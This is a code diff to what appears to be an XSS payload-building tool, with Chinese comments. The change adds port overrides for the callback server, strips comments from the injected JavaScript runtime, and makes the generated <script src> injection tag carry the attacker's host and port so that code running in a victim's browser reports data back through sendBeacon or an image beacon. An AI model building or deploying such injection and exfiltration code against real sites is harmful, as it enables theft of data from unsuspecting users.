@@ -40,15 +40,17 @@ def _render(template: str, context: Dict[str, Any], config: Any) -> str:
             return _html_escape(str(context.get("host", "127.0.0.1")))
         if expr.startswith("config."):
             key = expr[len("config."):]
+            # port 允许被调用方 context 覆盖(payload 反连端口设置)
+            if key == "port" and "port" in context:
+                return _html_escape(str(context["port"]))
             return _html_escape(str(getattr(config, key, "")))
         return _html_escape(str(context.get(expr, "")))
 
     return _PLACEHOLDER_RE.sub(replace, template)
 
 
-# 公共运行时前缀(注入到每个 payload 顶部)
-_RUNTIME_PREFIX = r"""/* ==== runtime ==== */
-var SERVER = "http://{{host}}:{{config.port}}";
+# 公共运行时前缀(注入到每个 payload 顶部;紧凑无注释)
+_RUNTIME_PREFIX = r"""var SERVER = "http://{{host}}:{{config.port}}";
 function _q(name, dflt) {
   try {
     var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
@@ -59,17 +61,13 @@ function report(d) {
   try {
     var payload = JSON.stringify(d);
     if (navigator.sendBeacon) {
-      // 主路径:POST 发送(keepalive,页面卸载也能发出;数据在 body 不在 URL,
-      // 无 2-8KB URL 长度限制,Referer 也不携带回传内容)
       navigator.sendBeacon(SERVER + "{{config.route_report}}", payload);
     } else {
-      // 老浏览器回退:Image beacon GET,截断到 URL 安全长度防丢失
       var body = encodeURIComponent(payload.slice(0, 1800));
       new Image().src = SERVER + "{{config.route_report}}?d=" + body;
     }
   } catch (e) {}
 }
-/* ==== end runtime ==== */
 """
 
 
@@ -81,11 +79,12 @@ class PayloadBuilder:
         self._config = config
 
     def build(self, name: str, params: Optional[Dict[str, Any]] = None,
-              host: str = "") -> Dict[str, Any]:
+              host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
         """构建指定模块的最终 JS 代码。
 
         params: 模块参数 dict(可选,缺省用模块声明参数的默认提示值)
         host:   反连地址覆盖(缺省 127.0.0.1)
+        port:   反连端口覆盖(缺省 config.port;1-65535 校验,非法忽略)
 
         Returns: {"ok": True, "code": str} 或 {"ok": False, "error": str}
         """
@@ -97,6 +96,13 @@ class PayloadBuilder:
         if unknown:
             return {"ok": False, "error": f"未知参数: {sorted(unknown)}"}
         context = {"host": host or "127.0.0.1"}
+        if port is not None:
+            try:
+                p = int(port)
+                if 1 <= p <= 65535:
+                    context["port"] = p
+            except (TypeError, ValueError):
+                pass
         for pname in declared:
             if params and pname in params and params[pname] is not None:
                 context[pname] = str(params[pname])
@@ -119,8 +125,10 @@ class PayloadBuilder:
         return {"ok": True, "code": code, "module": name}
 
     def build_script_tag(self, name: str, params: Optional[Dict[str, Any]] = None,
-                         host: str = "") -> Dict[str, Any]:
+                         host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
         """生成 XSS 注入用 <script src> 标签。
+
+        host/port: 反连地址/端口覆盖(缺省 127.0.0.1 / config.port)
 
         Returns: {"ok": True, "tag": str, "url": str} 或 {"ok": False, ...}
         """
@@ -128,12 +136,34 @@ class PayloadBuilder:
         if not mod:
             return {"ok": False, "error": f"模块 {name} 不存在"}
         parts = [f"m={name}"]
+        # host/port 解析优先级:显式参数 → 模块参数(params,如 xss_payload 自带 host)→ 默认
+        # 否则构建界面在模块参数里填了 host、单独输入框留空时,URL 会回退 127.0.0.1
+        eff_host = host or (params or {}).get("host") or ""
+        eff_port = port
+        if eff_port is None and params and str(params.get("port") or "").strip():
+            eff_port = str(params["port"]).strip()
+        # host/port 作为查询参数带进 URL——受害者浏览器加载 payload.js 时,
+        # _handle_payload 从 URL 读 host/port,payload 内部 SERVER 才会回连真实服务器。
+        if eff_host:
+            parts.append(f"host={_urlencode(eff_host)}")
+        if eff_port is not None:
+            parts.append(f"port={eff_port}")
         if params:
             for k, v in params.items():
+                if k in ("host", "port"):
+                    continue   # 已由 URL 参数承载,避免重复
                 if v not in (None, ""):
                     parts.append(f"{k}={_urlencode(str(v))}")
         qs = "?" + "&".join(parts)
-        url = (f"http://{host or '127.0.0.1'}:{self._config.port}"
+        p = self._config.port
+        if eff_port is not None:
+            try:
+                pi = int(eff_port)
+                if 1 <= pi <= 65535:
+                    p = pi
+            except (TypeError, ValueError):
+                pass
+        url = (f"http://{eff_host or '127.0.0.1'}:{p}"
                f"{self._config.route_payload}{qs}")
         tag = f'<script src="{url}"></script>'
         return {"ok": True, "tag": tag, "url": url}
